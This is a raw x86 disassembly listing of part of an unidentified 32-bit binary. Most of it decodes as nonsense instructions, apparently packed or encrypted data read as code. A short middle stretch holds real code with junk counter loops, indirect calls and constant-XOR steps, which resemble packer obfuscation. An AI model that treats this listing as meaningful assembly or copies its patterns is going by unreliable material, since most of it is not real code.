  41d411:	and    DWORD PTR [ecx+edx*1],0x9ad504b6
  41d418:	mov    eax,es
  41d41a:	repnz hlt 
  41d41c:	jl     0x41d469
  41d41e:	ja     0x41d3f0
  41d420:	aaa    
  41d421:	repnz out dx,eax
  41d423:	bound  ebx,QWORD PTR [ebx]
  41d425:	mov    edx,0xef27981e
  41d42a:	mov    ah,0x9a
  41d42c:	js     0x41d3d4
  41d42e:	sahf   
  41d42f:	fs jecxz 0x41d47f
  41d432:	jno    0x41d402
  41d434:	mul    edi
  41d436:	shr    DWORD PTR ds:0xc920ffb0,0x77
  41d43d:	not    BYTE PTR [esi-0x19]
  41d440:	je     0x41d427
  41d442:	fdiv   QWORD PTR [esi-0x52]
  41d445:	clc    
  41d446:	stos   DWORD PTR es:[edi],eax
  41d447:	cdq    
  41d448:	data16 addr16 jp 0x41d3f0
  41d44c:	sub    dh,BYTE PTR [edi+0xb3f2ed2]
  41d452:	adc    eax,0xbf1c45be
  41d457:	xchg   edi,eax
  41d458:	sbb    edi,0x63727e19
  41d45e:	sbb    eax,0x97707190
  41d463:	fild   DWORD PTR [edx+0x4f]
  41d466:	neg    DWORD PTR [ebp-0x1b]
  41d469:	xlat   BYTE PTR ds:[ebx]
  41d46a:	ret    
  41d46b:	fdiv   st,st(7)
  41d46d:	adc    DWORD PTR [esp+esi*1-0x43],ebp
  41d471:	cmp    eax,0x75c0bfc9
  41d476:	pop    ebx
  41d477:	jnp    0x41d468
  41d479:	in     al,0x6b
  41d47b:	sub    ebx,DWORD PTR [edx-0x6e]
  41d47e:	(bad)  
  41d47f:	sub    al,0xdc
  41d481:	out    0xb5,eax
  41d483:	mov    eax,0xe6c363e1
  41d488:	mov    dh,0xa2
  41d48a:	(bad)  
  41d48c:	xor    dh,al
  41d48e:	mov    bl,al
  41d490:	xchg   ecx,ebx
  41d492:	push   ebx
  41d493:	jmp    0x41d484
  41d495:	leave  
  41d496:	mov    edi,0xddf0cf01
  41d49b:	xor    DWORD PTR [ebx],ebp
  41d49d:	xchg   esp,eax
  41d49e:	xor    ah,BYTE PTR [esi-0xa60cc93]
  41d4a4:	mov    eax,0x280062f5
  41d4a9:	pop    es
  41d4aa:	jle    0x41d442
  41d4ac:	mov    DWORD PTR [eax+0x6c],esi
  41d4af:	sahf   
  41d4b0:	jb     0x41d529
  41d4b2:	mov    ch,bh
  41d4b4:	outs   dx,BYTE PTR ds:[esi]
  41d4b5:	pop    esp
  41d4b6:	ja     0x41d4fc
  41d4b8:	pop    ds
  41d4b9:	clc    
  41d4ba:	cmp    al,0xeb
  41d4bc:	cmp    ebx,DWORD PTR [esi+0x6b]
  41d4bf:	cmp    eax,ecx
  41d4c1:	outs   dx,BYTE PTR ds:[esi]
  41d4c2:	add    al,BYTE PTR [esi-0xe]
  41d4c5:	(bad)  
  41d4c7:	repz mov ?,WORD PTR [ecx]
  41d4ca:	and    edi,ecx
  41d4cc:	cdq    
  41d4cd:	mov    ds:0x6c10f675,al
  41d4d2:	inc    esi
  41d4d3:	clc    
  41d4d4:	jmp    FWORD PTR [esi-0x350a69ae]
  41d4da:	cld    
  41d4db:	mov    ah,0x20
  41d4dd:	add    ebp,DWORD PTR [esi+0x74ad350b]
  41d4e3:	(bad)
  41d4e6:	out    0x27,al
  41d4e8:	addr16 (bad) 
  41d4eb:	test   eax,0x98117bef
  41d4f0:	push   0xff94e08
  41d4f5:	mov    esp,DWORD PTR [eax]
  41d4f7:	into   
  41d4f8:	daa    
  41d4f9:	nop
  41d4fa:	sbb    BYTE PTR [esi],dh
  41d4fc:	sub    al,0xf8
  41d4fe:	xchg   esp,eax
  41d4ff:	(bad)  
  41d500:	mov    eax,ds:0xe314d689
  41d505:	sahf   
  41d506:	or     DWORD PTR [ebp+ebp*4-0x3b9e8f8c],ebx
  41d50d:	jmp    0xb206934
  41d512:	mov    esp,0x342c96d9
  41d517:	pop    es
  41d518:	or     BYTE PTR [eax+0x3d47a96b],bh
  41d51e:	data16 xlat BYTE PTR ds:[ebx]
  41d520:	push   ebp
  41d521:	xchg   ebp,eax
  41d522:	jbe    0x41d506
  41d524:	ins    BYTE PTR es:[edi],dx
  41d525:	fadd   DWORD PTR [esi+0x197bfd3c]
  41d52b:	cmp    bh,bh
  41d52d:	mov    edi,0x2e57b88b
  41d532:	test   eax,0x58ded420
  41d537:	int    0x58
  41d539:	mov    ch,0x5b
  41d53b:	ds jo  0x41d5a0
  41d53e:	or     DWORD PTR [esi+0x6996611a],ebp
  41d544:	pop    ss
  41d545:	push   ds
  41d546:	jo     0x41d4eb
  41d548:	jae    0x41d5b5
  41d54a:	xor    DWORD PTR [esi],edx
  41d54c:	inc    esi
  41d54d:	mov    ch,0x94
  41d54f:	add    dh,BYTE PTR [ebx]
  41d551:	ins    DWORD PTR es:[edi],dx
  41d552:	enter  0xc5ce,0x9b
  41d556:	push   ebx
  41d557:	pop    eax
  41d558:	cmp    ecx,DWORD PTR [edx-0x12]
  41d55b:	cwde   
  41d55c:	mov    bl,0xb4
  41d55e:	or     ch,BYTE PTR [ecx+0x27bfdf84]
  41d564:	inc    edi
  41d565:	jmp    0xdcc2:0xdd93c42a
  41d56c:	pop    ds
  41d56d:	mov    ds:0x4af5875a,eax
  41d572:	clc    
  41d573:	or     al,0xb7
  41d575:	fisub  WORD PTR [esi+0x1f5501e]
  41d57b:	enter  0x314d,0x33
  41d57f:	repnz popa 
  41d581:	mov    ds:0xb3cb1239,eax
  41d586:	mov    WORD PTR [edx+esi*2-0x1f12a247],ds
  41d58d:	push   ebp
  41d58e:	pop    ecx
  41d58f:	popf   
  41d590:	arpl   WORD PTR [edx+0x573f7f20],cx
  41d596:	cmp    dl,BYTE PTR [ebp+0x8ffc2f6]
  41d59c:	cmp    ecx,DWORD PTR [edx-0x786c2bac]
  41d5a2:	out    0xa7,al
  41d5a4:	cdq    
  41d5a5:	scas   al,BYTE PTR es:[edi]
  41d5a6:	sahf   
  41d5a7:	add    al,dl
  41d5a9:	sbb    BYTE PTR [ebx+0x7a5c095e],al
  41d5af:	or     ebx,DWORD PTR [ecx]
  41d5b1:	jle    0x41d560
  41d5b3:	pop    esi
  41d5b4:	ficom  DWORD PTR [esi-0xa9f1ba5]
  41d5ba:	xchg   DWORD PTR [ebx-0x30],eax
  41d5bd:	sub    esp,DWORD PTR [ecx]
  41d5bf:	mov    DWORD PTR [eax-0x61],edx
  41d5c2:	xor    BYTE PTR [ecx-0xd],cl
  41d5c5:	jl     0xed6576d4
  41d5cb:	jmp    0x76483281
  41d5d0:	xor    ebp,DWORD PTR [esi+eiz*4]
  41d5d3:	adc    al,0x5c
  41d5d5:	adc    eax,0x80cb8dc4
  41d5da:	icebp  
  41d5db:	dec    eax
  41d5dc:	rcr    BYTE PTR [eax-0x43],1
  41d5df:	mov    esi,DWORD PTR [ecx]
  41d5e1:	cli    
  41d5e2:	fs xor edx,0x5e
  41d5e6:	scas   eax,DWORD PTR es:[edi]
  41d5e7:	sbb    bh,bh
  41d5e9:	xchg   edi,eax
  41d5ea:	test   BYTE PTR [edx+0x314a791d],bh
  41d5f0:	fst    QWORD PTR ds:[eax+0x71]
  41d5f4:	std    
  41d5f5:	stos   DWORD PTR es:[edi],eax
  41d5f6:	lock loop 0x41d5ea
  41d5f9:	push   ds
  41d5fa:	pusha  
  41d5fb:	shl    DWORD PTR [edi+0x78],cl
  41d5fe:	stos   DWORD PTR es:[edi],eax
  41d5ff:	loop   0x41d659
  41d601:	mov    bh,BYTE PTR [ecx]
  41d603:	xchg   edx,eax
  41d604:	aas    
  41d605:	and    eax,DWORD PTR [ebx-0x2f]
  41d608:	mov    bh,0xc0
  41d60a:	fild   WORD PTR [edi-0x6f5c3111]
  41d610:	lea    ecx,[edx+ecx*1+0x241fcde]
  41d617:	mov    DWORD PTR [ebp-0x48],ecx
  41d61a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d61d:	mov    edx,0xfa5e1521
  41d622:	sub    edx,ecx
  41d624:	add    edx,DWORD PTR [ebp-0x44]
  41d627:	mov    DWORD PTR [ebp-0x44],edx
  41d62a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d62d:	xor    ecx,eax
  41d62f:	add    ecx,esi
  41d631:	jne    0x41b215
  41d637:	mov    ecx,DWORD PTR [ebp-0x8]
  41d63a:	xor    ecx,eax
  41d63c:	mov    eax,DWORD PTR [ebp+0x10]
  41d63f:	add    ecx,esi
  41d641:	mov    DWORD PTR [eax],ecx
  41d643:	pop    edi
  41d644:	pop    esi
  41d645:	pop    ebx
  41d646:	leave  
  41d647:	ret    0xc
  41d64a:	push   ebp
  41d64b:	mov    ebp,esp
  41d64d:	sub    esp,0x7c
  41d650:	or     ecx,0x868
  41d656:	push   esi
  41d657:	and    DWORD PTR ds:0x42862f,0x0
  41d661:	jmp    0x41d674
  41d666:	xor    eax,eax
  41d668:	or     eax,DWORD PTR ds:0x42862f
  41d66e:	inc    eax
  41d66f:	mov    ds:0x42862f,eax
  41d674:	cmp    DWORD PTR ds:0x42862f,0x1b
  41d67b:	jae    0x41d6a6
  41d681:	cmp    DWORD PTR ds:0x42862f,0x24
  41d688:	jbe    0x41d6a6
  41d68e:	jmp    0x41d6a1
  41d693:	push   DWORD PTR [ebp-0x28]
  41d696:	push   0x42865b
  41d69b:	call   DWORD PTR ds:0x4287b3
  41d6a1:	jmp    0x41d666
  41d6a6:	push   edi
  41d6a7:	mov    eax,ds:0x4282ef
  41d6ac:	mov    DWORD PTR ds:0x42866f,0x15
  41d6b6:	cmp    DWORD PTR ds:0x42866f,0x0
  41d6bd:	je     0x41d6ed
  41d6c3:	cmp    DWORD PTR ds:0x42866f,0x1f
  41d6ca:	jl     0x41d6ed
  41d6d0:	jmp    0x41d6db
  41d6d5:	call   DWORD PTR ds:0x4287b7
  41d6db:	mov    ecx,DWORD PTR ds:0x42866f
  41d6e1:	dec    ecx
  41d6e2:	mov    DWORD PTR ds:0x42866f,ecx
  41d6e8:	jmp    0x41d6b6
  41d6ed:	mov    DWORD PTR [ebp-0x24],eax
  41d6f0:	xor    eax,eax
  41d6f2:	add    eax,DWORD PTR ds:0x42868b
  41d6f8:	mov    edi,DWORD PTR ds:0x428707
  41d6fe:	sub    eax,edi
  41d700:	xor    eax,DWORD PTR [eax+edi*1]
  41d703:	mov    eax,ds:0x4283fb
  41d708:	not    DWORD PTR ds:0x428613
  41d70e:	mov    DWORD PTR [ebp-0x34],eax
  41d711:	and    DWORD PTR [ebp-0x30],0x0
  41d715:	sub    esi,0x14f1
  41d71b:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  41d722:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  41d729:	xor    edi,edi
  41d72b:	mov    eax,DWORD PTR [ebp-0x10]
  41d72e:	mov    esi,DWORD PTR ds:0x42860b
  41d734:	add    DWORD PTR ds:0x428653,esi
  41d73a:	mov    ecx,DWORD PTR [ebp-0x10]
  41d73d:	mov    DWORD PTR ds:0x42860f,0x19
  41d747:	cmp    DWORD PTR ds:0x42860f,0x0
  41d74e:	je     0x41d783
  41d754:	cmp    DWORD PTR ds:0x42860f,0x24
  41d75b:	jge    0x41d783
  41d761:	jmp    0x41d76f
  41d766:	push   DWORD PTR [ebp-0x14]
  41d769:	call   DWORD PTR ds:0x4287bb
  41d76f:	xor    edi,edi
  41d771:	xor    edi,DWORD PTR ds:0x42860f
  41d777:	dec    edi
  41d778:	mov    DWORD PTR ds:0x42860f,edi
  41d77e:	jmp    0x41d747
  41d783:	sub    eax,ecx
  41d785:	add    DWORD PTR ds:0x42865b,ecx
  41d78b:	mov    DWORD PTR [ebp-0x10],eax
  41d78e:	sub    edi,edi
  41d790:	xor    DWORD PTR [ebp-0x10],0xf89cb5b0
  41d797:	mov    edi,DWORD PTR ds:0x42862b
  41d79d:	adc    edi,DWORD PTR ds:0x42864b
  41d7a3:	mov    DWORD PTR ds:0x42862b,edi
  41d7a9:	mov    eax,DWORD PTR [ebp-0x18]
  41d7ac:	inc    edi
  41d7ad:	mov    ecx,DWORD PTR [ebp-0x18]
  41d7b0:	and    DWORD PTR ds:0x42862f,0x0
  41d7ba:	mov    esi,DWORD PTR ds:0x42862f
  41d7c0:	inc    esi
  41d7c1:	mov    DWORD PTR ds:0x42862f,esi
  41d7c7:	cmp    DWORD PTR ds:0x42862f,0x21
  41d7ce:	jb     0x41d804
  41d7d4:	jmp    0x41d7f7
  41d7d9:	push   0x2450
  41d7de:	push   0x4280ae
  41d7e3:	push   DWORD PTR [ebp-0x20]
  41d7e6:	push   0x428083
  41d7eb:	push   DWORD PTR [ebp-0x18]
  41d7ee:	push   DWORD PTR [ebp-0x28]
  41d7f1:	call   DWORD PTR ds:0x4287bf
  41d7f7:	cmp    DWORD PTR ds:0x42862f,0x1d
  41d7fe:	jb     0x41d7ba
  41d804:	sub    eax,ecx
  41d806:	mov    DWORD PTR ds:0x428667,0x2f20
  41d810:	mov    DWORD PTR [ebp-0x18],eax
  41d813:	or     DWORD PTR [ebp-0x18],0xf89f05b0
  41d81a:	sbb    edi,edi
  41d81c:	mov    eax,DWORD PTR [ebp-0xc]
  41d81f:	xor    ecx,ecx
  41d821:	or     ecx,DWORD PTR ds:0x428697
  41d827:	mov    esi,DWORD PTR ds:0x42869f
  41d82d:	sub    ecx,esi
  41d82f:	or     ecx,DWORD PTR [ecx+esi*1]
  41d832:	mov    ecx,DWORD PTR [ebp-0xc]
  41d835:	sub    eax,ecx
  41d837:	and    DWORD PTR ds:0x42863b,0x0
  41d841:	jmp    0x41d853
  41d846:	mov    esi,DWORD PTR ds:0x42863b
  41d84c:	inc    esi
  41d84d:	mov    DWORD PTR ds:0x42863b,esi
  41d853:	cmp    DWORD PTR ds:0x42863b,0x16
  41d85a:	jae    0x41d89c
  41d860:	cmp    DWORD PTR ds:0x42863b,0x9
  41d867:	jle    0x41d89c
  41d86d:	jmp    0x41d87d
  41d872:	push   0x428083
  41d877:	call   DWORD PTR ds:0x4287c3
  41d87d:	cmp    DWORD PTR ds:0x42863b,0x8
  41d884:	jne    0x41d897
  41d88a:	mov    esi,DWORD PTR ds:0x42863b
  41d890:	inc    esi
  41d891:	mov    DWORD PTR ds:0x42863b,esi
  41d897:	jmp    0x41d846
  41d89c:	mov    DWORD PTR [ebp-0xc],eax
  41d89f:	or     DWORD PTR [ebp-0xc],0xf89c85f0
  41d8a6:	mov    eax,DWORD PTR [ebp-0x1c]
  41d8a9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d8ac:	sub    eax,ecx
  41d8ae:	mov    DWORD PTR [ebp-0x1c],eax
  41d8b1:	or     DWORD PTR [ebp-0x1c],0xf89c8590
  41d8b8:	mov    eax,DWORD PTR [ebp-0x20]
  41d8bb:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8be:	sub    eax,ecx
  41d8c0:	mov    DWORD PTR [ebp-0x20],eax
  41d8c3:	mov    eax,DWORD PTR [ebp-0x2c]
  41d8c6:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8c9:	mov    esi,0x75108a4
  41d8ce:	xor    eax,esi
  41d8d0:	mov    edi,0x3272ec
  41d8d5:	add    eax,edi
  41d8d7:	or     eax,ecx
  41d8d9:	mov    DWORD PTR [ebp-0x20],eax
  41d8dc:	mov    eax,DWORD PTR [ebp-0x4]
  41d8df:	mov    ecx,DWORD PTR [ebp-0x4]
  41d8e2:	sub    eax,ecx
  41d8e4:	mov    DWORD PTR [ebp-0x4],eax
  41d8e7:	or     DWORD PTR [ebp-0x4],0xf89c85bd
  41d8ee:	mov    eax,DWORD PTR [ebp-0xc]
  41d8f1:	xor    eax,esi
  41d8f3:	add    eax,edi
  41d8f5:	push   eax
  41d8f6:	mov    eax,DWORD PTR [ebp-0x10]
  41d8f9:	xor    eax,esi
  41d8fb:	add    eax,edi
  41d8fd:	push   eax
  41d8fe:	mov    eax,DWORD PTR [ebp-0x4]
  41d901:	xor    eax,esi
  41d903:	add    eax,edi
  41d905:	push   eax
  41d906:	lea    eax,[ebp-0x7c]
  41d909:	push   eax
  41d90a:	push   DWORD PTR [ebp-0x2c]
  41d90d:	push   DWORD PTR [ebp-0x28]
  41d910:	call   0x40f37f
  41d915:	test   eax,eax
  41d917:	je     0x41fca5
  41d91d:	lea    eax,[ebp-0x7c]
  41d920:	push   eax
  41d921:	mov    eax,DWORD PTR [ebp-0x28]
  41d924:	jmp    0x41fc84
  41d929:	fs popa 
  41d92b:	dec    eax
  41d92c:	mov    cs,WORD PTR [ebx+0x7b]
  41d92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d930:	jnp    0x41d8c9
  41d932:	rol    edx,1
  41d934:	aaa    
  41d935:	ret    
  41d936:	popf   
  41d937:	xor    BYTE PTR [edi+0x2a],bh
  41d93a:	aam    0x7d
  41d93c:	jp     0x41d97d
  41d93e:	pop    edi
  41d93f:	jp     0x41d9bb
  41d941:	clc    
  41d942:	mov    dh,0x94
  41d944:	and    al,0xad
  41d946:	(bad)  
  41d947:	aam    0x63
  41d949:	int3   
  41d94a:	imul   ebp,DWORD PTR ds:0x3e756c7f,0x7c
  41d951:	xchg   esp,eax
  41d952:	inc    ebx
  41d953:	mov    edi,eax
  41d955:	int    0x9d
  41d957:	imul   ebx,DWORD PTR [ebx+0x4d],0xffffffd3
  41d95b:	push   esp
  41d95c:	mov    esp,DWORD PTR [ebx]
  41d95e:	xchg   ecx,eax
  41d95f:	nop
  41d960:	popf   
  41d961:	ins    BYTE PTR es:[edi],dx
  41d962:	frstor [ebp-0x3a248431]
  41d968:	adc    DWORD PTR [eax-0x56be797d],esp
  41d96e:	adc    DWORD PTR [edi+ecx*8+0x4b41e05e],esp
  41d975:	arpl   WORD PTR [ecx+0x3d],cx
  41d978:	and    eax,edx
  41d97a:	adc    eax,0x742cef66
  41d97f:	mov    esp,0x7efa9b6a
  41d984:	push   ss
  41d985:	mov    WORD PTR [eax-0x45],?
  41d988:	xor    al,0xa7
  41d98a:	adc    al,0x58
  41d98c:	xchg   esi,eax
  41d98d:	mov    dl,0xe
  41d98f:	test   DWORD PTR [ecx-0x42],ebp
  41d992:	arpl   WORD PTR [eax],ax
  41d994:	(bad)  
  41d995:	push   ds
  41d996:	xor    al,0x8e
  41d998:	out    dx,eax
  41d999:	fild   QWORD PTR [ebx-0x436c3db]
  41d99f:	jg     0x41d981
  41d9a1:	inc    eax
  41d9a2:	push   eax
  41d9a3:	dec    ecx
  41d9a4:	xlat   BYTE PTR ds:[ebx]
  41d9a5:	xor    al,0xad
  41d9a7:	in     eax,0xc9
  41d9a9:	jbe    0x41d9c2
  41d9ab:	push   ebp
  41d9ac:	add    cl,BYTE PTR [esi]
  41d9ae:	sbb    DWORD PTR [ecx],ebp
  41d9b0:	shl    DWORD PTR [edx],0x9b
  41d9b3:	xchg   esi,eax
  41d9b4:	add    DWORD PTR [ebp+0x36],edx
  41d9b7:	mov    bh,0xa4
  41d9b9:	push   edx
  41d9ba:	push   0xfffffffc
  41d9bc:	sub    edx,DWORD PTR ds:[edx+0x4d00945b]
  41d9c3:	and    al,0x3a
  41d9c5:	int3   
  41d9c6:	dec    eax
  41d9c7:	mov    ds:0xc5753baa,al
  41d9cc:	dec    ebx
  41d9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ce:	rsm    
  41d9d0:	mov    esp,0xca2b7488
  41d9d5:	add    BYTE PTR ds:0x3de6df2b,0x9
  41d9dc:	xchg   esi,eax
  41d9dd:	mov    cl,0xb3
  41d9df:	push   ds
  41d9e0:	and    esi,ebp
  41d9e2:	cmc    
  41d9e3:	push   0xa8b1d5c5
  41d9e8:	dec    ebx
  41d9e9:	sbb    edx,eax
  41d9eb:	adc    eax,edx
  41d9ed:	lods   eax,DWORD PTR ds:[esi]
  41d9ee:	loope  0x41da65
  41d9f0:	xchg   DWORD PTR [edi+ebp*8-0xf],esp
  41d9f4:	dec    eax
  41d9f5:	test   eax,0x6c76512d
  41d9fa:	shr    BYTE PTR [eax+0x156114b],0x73
  41da01:	sub    eax,0xcd1f299d
  41da06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da07:	std    
  41da08:	sub    esi,DWORD PTR [eax]
  41da0a:	xlat   BYTE PTR ds:[ebx]
  41da0b:	les    ebp,FWORD PTR [edi+ebp*1]
  41da0e:	stos   BYTE PTR es:[edi],al
  41da0f:	aad    0xa3
  41da11:	hlt    
  41da12:	idiv   BYTE PTR [esi]
  41da14:	lock push edx
  41da16:	bound  ebx,QWORD PTR [eax]
  41da18:	aam    0xe0
  41da1a:	sub    ebp,edi
  41da1c:	test   BYTE PTR [ebx],cl
  41da1e:	cmp    dl,BYTE PTR [ecx*4+0x33fd11ef]
  41da25:	scas   al,BYTE PTR es:[edi]
  41da26:	leave  
  41da27:	fstp   TBYTE PTR [ecx+0x17]
  41da2a:	sbb    al,0x5
  41da2c:	popf   
  41da2d:	mov    ds:0x5ba1ed96,al
  41da32:	imul   eax,ecx,0x14
  41da35:	fdiv   QWORD PTR [ecx-0x14]
  41da38:	xchg   edi,eax
  41da39:	je     0x41daa6
  41da3b:	push   ss
  41da3c:	and    ebp,edx
  41da3e:	push   ecx
  41da3f:	nop
  41da40:	mov    al,ds:0xed0bf8a4
  41da46:	and    DWORD PTR [edx+0x79],ebx
  41da49:	jbe    0x41da44
  41da4b:	add    al,0x88
  41da4d:	dec    esi
  41da4e:	xlat   BYTE PTR ds:[ebx]
  41da4f:	in     eax,dx
  41da50:	pop    ecx
  41da51:	inc    edi
  41da52:	mov    dh,0x43
  41da54:	or     cl,BYTE PTR [ebp+0x6]
  41da57:	push   esi
  41da58:	in     eax,dx
  41da59:	push   ds
  41da5a:	neg    DWORD PTR [esi+0x3d]
  41da5d:	loop   0x41dab7
  41da5f:	push   edi
  41da60:	and    eax,DWORD PTR [edi-0x617c344a]
  41da66:	or     dh,ah
  41da68:	call   0x1c9d:0x5741ae45
  41da6f:	xor    eax,0x7baab0fc
  41da74:	dec    edi
  41da75:	xor    BYTE PTR [eax-0x35928fb6],bh
  41da7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da7c:	sbb    DWORD PTR [edx],0xfffffff3
  41da7f:	dec    ecx
  41da80:	test   al,0xdf
  41da82:	mov    eax,ds:0x584bf511
  41da87:	jbe    0x41da63
  41da89:	fisub  DWORD PTR [ebp+0x10451607]
  41da8f:	sbb    eax,0x571e239f
  41da94:	jns    0x41da89
  41da96:	ds dec esp
  41da98:	mov    dh,0x1c
  41da9a:	aaa    
  41da9b:	cdq    
  41da9c:	add    DWORD PTR [ebp+ebx*4-0x7abc02a2],eax
  41daa3:	or     eax,0x33fd7e47
  41daa8:	retf   
  41daa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daaa:	jb     0x41dacb
  41daac:	cmp    bh,bl
  41daae:	and    dh,BYTE PTR [edx+0x45]
  41dab1:	call   0x408a:0x45f68301
  41dab8:	jns    0x41dae9
  41daba:	and    BYTE PTR [ecx+0x50],al
  41dabd:	test   BYTE PTR [ebp-0x66ad3c5b],bl
  41dac3:	fcmovnb st,st(7)
  41dac5:	mov    esi,0xa693a20f
  41daca:	sub    ch,BYTE PTR [esi]
  41dacc:	adc    cl,ch
  41dace:	lods   eax,DWORD PTR ds:[esi]
  41dacf:	jecxz  0x41db24
  41dad1:	sar    BYTE PTR [ebp+0x7c],1
  41dad4:	cld    
  41dad5:	int    0x94
  41dad7:	inc    eax
  41dad8:	call   0x8d27:0x84ab08f9
  41dadf:	jbe    0x41dacb
  41dae1:	and    DWORD PTR [edx+ecx*4],esp
  41dae4:	pop    edx
  41dae5:	add    al,0xc2
  41dae7:	stos   DWORD PTR es:[edi],eax
  41dae8:	pop    edi
  41dae9:	mov    ecx,0x7e5ed578
  41daee:	push   ds
  41daef:	xor    BYTE PTR [ebx-0x1e],al
  41daf2:	and    BYTE PTR [ebp+eiz*1-0x68449729],ch
  41daf9:	pmaddwd mm0,mm5
  41dafc:	mov    dh,0x21
  41dafe:	(bad)  
  41daff:	in     eax,dx
  41db00:	ret    
  41db01:	inc    edx
  41db02:	sub    DWORD PTR [ecx+0x25042509],ebx
  41db08:	aaa    
  41db09:	or     eax,0xb5f8909f
  41db0e:	mov    ebp,0x3e6e1f2f
  41db13:	push   0xffffff8e
  41db15:	data16 fisub WORD PTR [ebp+0x73e15e61]
  41db1c:	mov    dh,0x41
  41db1e:	mov    dh,dh
  41db20:	xchg   esi,eax
  41db21:	xchg   DWORD PTR [esi],ebp
  41db23:	push   ebx
  41db24:	xchg   ebp,eax
  41db25:	jp     0x41dae3
  41db27:	cmp    DWORD PTR [ecx],0x7d
  41db2a:	xchg   BYTE PTR [ecx],bl
  41db2c:	and    eax,DWORD PTR [edi-0x39]
  41db2f:	inc    edi
  41db30:	xchg   ebp,eax
  41db31:	jb     0x41db95
  41db33:	setae  ch
  41db36:	ds xor ch,bl
  41db39:	mov    al,ds:0x4fca2f16
  41db3e:	bnd jge 0x41dbbf
  41db41:	xchg   ebx,eax
  41db42:	fwait
  41db43:	dec    ebp
  41db44:	pop    es
  41db45:	mov    DWORD PTR [ebx-0x44d6b2d3],edi
  41db4b:	enter  0x293f,0xc
  41db4f:	pop    ecx
  41db50:	shl    DWORD PTR [ebp-0x4a4ea153],0x2
  41db57:	or     al,0xe9
  41db59:	test   BYTE PTR [edx+0x62],cl
  41db5c:	mov    bh,0x71
  41db5e:	mov    eax,ds:0xd8841776
  41db63:	int    0xaa
  41db65:	jb     0x41db83
  41db67:	cld    
  41db68:	and    DWORD PTR [edi+0x1ca2865f],esp
  41db6e:	and    eax,0xa3478d44
  41db73:	mov    ebp,0xc8360dec
  41db78:	popf   
  41db79:	loop   0x41db3f
  41db7b:	jp     0x41db57
  41db7d:	mov    ch,0xf8
  41db7f:	scas   eax,DWORD PTR es:[edi]
  41db80:	jo     0x41db49
  41db82:	out    dx,al
  41db83:	mov    cl,0x16
  41db85:	mov    al,ds:0x26add9e
  41db8a:	int    0x91
  41db8c:	and    al,0x6e
  41db8e:	arpl   WORD PTR [esi],ax
  41db90:	mov    ah,0xd1
  41db92:	jo     0x41db5a
  41db94:	test   DWORD PTR [ecx],esi
  41db96:	in     al,dx
  41db97:	or     DWORD PTR [ebx+0x25e422cf],eax
  41db9d:	mov    ds:0x18586281,eax
  41dba2:	cmp    ebx,DWORD PTR [ecx+eiz*1+0x3d452574]
  41dba9:	push   0x61
  41dbab:	fdiv   st(2),st
  41dbad:	xor    eax,DWORD PTR [ebx-0x25]
  41dbb0:	jecxz  0x41db43
  41dbb2:	dec    esi
  41dbb3:	pop    esp
  41dbb4:	cmp    DWORD PTR [eax+0x53b322f4],ebx
  41dbba:	cmp    DWORD PTR [ebx-0x48],ecx
  41dbbd:	push   cs
  41dbbe:	aam    0xa1
  41dbc0:	mov    fs,esi
  41dbc2:	and    DWORD PTR [esi+0x6b],ebx
  41dbc5:	push   ss
  41dbc6:	sub    edi,DWORD PTR [edx+0x2bf1c13e]
  41dbcc:	lods   eax,DWORD PTR ds:[esi]
  41dbcd:	(bad)  
  41dbce:	stos   DWORD PTR es:[edi],eax
  41dbcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbd0:	test   al,0x23
  41dbd2:	sub    BYTE PTR [ecx],ch
  41dbd4:	and    eax,0x5a2b01a9
  41dbd9:	jmp    0xd9ae8184
  41dbde:	jmp    0x702f6032
  41dbe3:	or     BYTE PTR [edx+0x26210da0],cl
  41dbe9:	adc    al,0x87
  41dbeb:	push   esi
  41dbec:	add    cl,BYTE PTR [edi+0x37]
  41dbef:	sbb    al,BYTE PTR [ebx+edx*2-0x62]
  41dbf3:	and    esi,ecx
  41dbf5:	dec    esp
  41dbf6:	jb     0x41dc49
  41dbf8:	jnp    0x41dc0d
  41dbfa:	xlat   BYTE PTR ds:[ebx]
  41dbfb:	jae    0x41dbdb
  41dbfd:	pop    ebx
  41dbfe:	arpl   WORD PTR [eax-0x48ac34d],sp
  41dc04:	ror    BYTE PTR ds:0x1459555f,cl
  41dc0a:	or     ah,bh
  41dc0c:	mov    bl,0x70
  41dc0e:	add    al,0xa9
  41dc10:	xchg   esi,eax
  41dc11:	xor    BYTE PTR [edi+ebx*2],bl
  41dc14:	and    ah,bl
  41dc16:	add    edx,DWORD PTR [esi]
  41dc18:	sub    eax,0xe9331fb8
  41dc1d:	add    al,0x71
  41dc1f:	mov    al,0x37
  41dc21:	call   0xacaf3891
  41dc26:	mov    edi,DWORD PTR [ebx-0x28]
  41dc29:	cs retf 
  41dc2b:	inc    edx
  41dc2c:	(bad)  
  41dc2e:	clc    
  41dc2f:	xor    DWORD PTR [eax-0x2ab5b528],edi
  41dc35:	fisubr WORD PTR [esi]
  41dc37:	nop
  41dc38:	into   
  41dc39:	push   cs
  41dc3a:	mov    edi,0x19ffd202
  41dc3f:	push   ss
  41dc40:	push   ss
  41dc41:	mov    esi,0x5c01599b
  41dc46:	inc    ebx
  41dc47:	stos   BYTE PTR es:[edi],al
  41dc48:	icebp  
  41dc49:	out    dx,eax
  41dc4a:	or     dh,BYTE PTR [esi+0x63]
  41dc4d:	or     al,0xf5
  41dc4f:	cmc    
  41dc50:	add    ebx,edi
  41dc52:	push   eax
  41dc53:	test   DWORD PTR [edx-0x35],0x1dd96884
  41dc5a:	push   0x60
  41dc5c:	pop    edi
  41dc5d:	repz fisubr WORD PTR [ecx]
  41dc60:	rep movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41dc63:	fcmovnbe st,st(7)
  41dc65:	cld    
  41dc66:	aaa    
  41dc67:	call   0xe15c8d42
  41dc6c:	fbld   TBYTE PTR [ecx+edi*4]
  41dc6f:	icebp  
  41dc70:	push   eax
